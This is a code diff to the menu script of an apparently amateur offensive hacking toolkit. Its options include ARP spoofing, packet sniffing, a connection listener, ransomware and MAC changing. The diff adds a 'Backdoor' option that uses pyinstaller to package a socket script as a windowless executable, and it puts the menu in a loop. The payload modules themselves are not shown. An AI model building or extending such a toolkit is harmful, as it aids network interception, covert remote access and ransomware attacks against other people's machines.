@@ -3,6 +3,7 @@ from Change_mac import mac
 import os
 import subprocess as sb
 from Listener import listener
+import re
 
 
 a = """
@@ -17,11 +18,11 @@ a = """
 7-)Hack connection console
 8-)Ransomware
 9-)Changemac
+10-)Backdoor
 example: use 1
 
 """
-print(a)
-user_input = input("input:")
+
 
 
 def change_mac():
@@ -52,15 +53,31 @@ def sniff():
     sniffing = packet_sniffing.NetScan()
     sniffing.sniff(iface)
 
-
-if user_input == 'use 9':
-    sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
-    change_mac()
-elif user_input == 'use 3':
-    netscan()
-elif user_input == 'use 2':
-    arp_spoof()
-elif user_input == 'use 4':
-    sniff()
-elif user_input == 'use 7':
-    Listen()
+def Backdoor():
+    sb.call(["pyinstaller","--onefile","-w","Bacdoor/my_socket.py"])
+    
+while True:
+    print(a)
+    user_input = input("input:")
+    try:
+        if  user_input == 'use 9':
+            change_mac()
+        elif user_input == 'use 3':
+            netscan()
+        elif user_input == 'use 2':
+            sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
+            arp_spoof()
+        elif user_input == 'use 4':
+            sniff()
+        elif user_input == 'use 7':
+            Listen()
+        elif user_input == 'use 10':
+            Backdoor()
+        elif user_input == 'exit' or user_input == 'EXIT':
+            exit()
+    except AttributeError:
+        print('ERROR!')
+    except ValueError:
+        print("ERROR!")
+    except KeyboardInterrupt:
+        print("Exit")
